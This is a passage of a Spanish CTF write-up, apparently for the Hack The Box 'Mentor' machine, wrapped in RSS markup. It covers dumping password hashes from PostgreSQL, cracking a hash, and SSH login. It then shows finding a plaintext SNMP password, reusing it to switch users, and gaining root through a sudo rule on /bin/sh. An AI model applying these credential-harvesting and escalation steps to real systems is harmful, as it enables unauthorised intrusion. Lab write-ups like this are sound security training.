+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>psql (15.7 (Debian 15.7-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>You are now connected to database <span style="color:#0ff;font-weight:bold">&#34;mentorquotes_db&#34;</span> as user <span style="color:#0ff;font-weight:bold">&#34;postgres&#34;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>mentorquotes_db=<span style="color:#007f7f"># \dt</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>          List of relations
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span> Schema |   Name   | Type  |  Owner
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>--------+----------+-------+----------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span> public | cmd_exec | table | postgres
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> public | quotes   | table | postgres
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> public | users    | table | postgres
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>(<span style="color:#ff0;font-weight:bold">3</span> rows)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>mentorquotes_db=<span style="color:#007f7f">#</span></span></span></code></pre></div>
+<p>Vemos varias tablas interesantes, pero la que mas me interesa es <code>cmd_exec</code>  ya que podría haberse ejecutado comandos que revelen credenciales&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>mentorquotes_db=# <span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span> id |         email          |  username   |             password
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#007f7f">----+------------------------+-------------+----------------------------------
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#007f7f"></span>  <span style="color:#ff0;font-weight:bold">1</span> | james@mentorquotes.htb | james       | <span style="color:#ff0;font-weight:bold">7</span>ccdcd8c05b59add9c198d492b36a503
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>  <span style="color:#ff0;font-weight:bold">2</span> | svc@mentorquotes.htb   | service_acc | <span style="color:#ff0;font-weight:bold">53</span>f22d0dfa10dce7e29cd31f4f953fd8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>(<span style="color:#ff0;font-weight:bold">2</span> <span style="color:#fff;font-weight:bold">rows</span>)</span></span></code></pre></div>
+<p>Estos hashes podremos intentar romperlos, aunque ya sabemos la contraseña para el usuario <code>james</code> ..</p>
+<p>Utilizando <a href="http://hashes.com">hashes.com</a> podemos ver que este hash ya había sido crackeado.
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Y ya podemos conectarnos con ssh y como el usuario <code>svc</code> con la credencial encontrada y ganamos acceso a la máquina víctima.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ssh svc@10.129.255.245
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>The authenticity of host <span style="color:#0ff;font-weight:bold">&#39;10.129.255.245 (10.129.255.245)&#39;</span> can<span style="color:#0ff;font-weight:bold">&#39;t be established.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#0ff;font-weight:bold">ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#0ff;font-weight:bold">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#0ff;font-weight:bold">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#0ff;font-weight:bold">Warning: Permanently added &#39;</span>10.129.255.245<span style="color:#0ff;font-weight:bold">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#0ff;font-weight:bold">svc@10.129.255.245&#39;</span>s password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>  System information as of Thu Aug  <span style="color:#ff0;font-weight:bold">1</span> 08:12:26 PM UTC <span style="color:#ff0;font-weight:bold">2024</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>  System load:                      0.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>  Usage of /:                       65.2% of 8.09GB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>  Memory usage:                     14%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>  Swap usage:                       0%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>  Processes:                        <span style="color:#ff0;font-weight:bold">249</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>  Users logged in:                  <span style="color:#ff0;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> br-028c7a43f929: 172.20.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> br-24ddaa1f3b47: 172.19.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> br-3d63c18e314d: 172.21.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> br-7d5c72654da7: 172.22.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> br-a8a89c3bf6ff: 172.18.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> docker0:         172.17.0.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>  IPv4 address <span style="color:#fff;font-weight:bold">for</span> eth0:            10.129.255.245
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>  IPv6 address <span style="color:#fff;font-weight:bold">for</span> eth0:            dead:beef::250:56ff:fe94:6a7f
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span><span style="color:#ff0;font-weight:bold">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>To check <span style="color:#fff;font-weight:bold">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>Last login: Mon Dec <span style="color:#ff0;font-weight:bold">12</span> 10:22:58 <span style="color:#ff0;font-weight:bold">2022</span> from 10.10.14.40
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>svc@mentor:~$</span></span></code></pre></div>
+<h1 id="user-pivoting">User Pivoting</h1>
+<p>Ejecutando <code>linpeas.sh</code> encontramos lo siguiente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>══════════╣ Analyzing SNMP Files (limit 70)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>-rw-r--r-- <span style="color:#ff0;font-weight:bold">1</span> root root <span style="color:#ff0;font-weight:bold">3453</span> Jun  <span style="color:#ff0;font-weight:bold">5</span>  <span style="color:#ff0;font-weight:bold">2022</span> /etc/snmp/snmpd.conf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#007f7f"># rocommunity: a SNMPv1/SNMPv2c read-only access community name</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>rocommunity  public default -V systemonly
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>rocommunity6 public default -V systemonly
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>createUser bootstrap MD5 SuperSecurePassword123__ DES
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>-rw------- <span style="color:#ff0;font-weight:bold">1</span> Debian-snmp Debian-snmp <span style="color:#ff0;font-weight:bold">1268</span> Aug  <span style="color:#ff0;font-weight:bold">1</span> 19:55 /var/lib/snmp/snmpd.conf</span></span></code></pre></div>
+<p>Y viendo los usuarios del sistema&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>svc@mentor:/tmp$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>svc:x:1001:1001:,,,:/home/svc:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>james:x:1000:1000:,,,:/home/james:/bin/bash</span></span></code></pre></div>
+<p><code>james:SuperSecurePassword123__</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>c@mentor:/tmp$ su james
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>james@mentor:/tmp$</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Ejecutando el comando <code>sudo -l</code></p>
+<p>Vemos que el usuario <code>james</code> puede ejecutar como el usuario que quiera, incluido <code>root</code>
+el comando binario <code>/bin/sh</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>james@mentor:/tmp$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>[sudo] password <span style="color:#fff;font-weight:bold">for</span> james:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Sorry, try again.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>[sudo] password <span style="color:#fff;font-weight:bold">for</span> james:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Matching Defaults entries <span style="color:#fff;font-weight:bold">for</span> james on mentor:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>    secure_path=/usr/local/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/local/bin<span style="color:#0ff;font-weight:bold">\:</span>/usr/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/bin<span style="color:#0ff;font-weight:bold">\:</span>/sbin<span style="color:#0ff;font-weight:bold">\:</span>/bin<span style="color:#0ff;font-weight:bold">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>    use_pty
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>User james may run the following commands on mentor:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    (ALL) /bin/sh</span></span></code></pre></div>
+<p>Así que aquí ya está mascada la escalada de privilegios.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>james@mentor:/tmp$ sudo /bin/sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#007f7f"># id</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>uid=0(root) gid=0(root) groups=0(root)</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#007f7f"># cat /root/root.txt</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>ef134ef73e65ef5c0...</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+]]></content:encoded>
     </item>
   </channel>
 </rss>
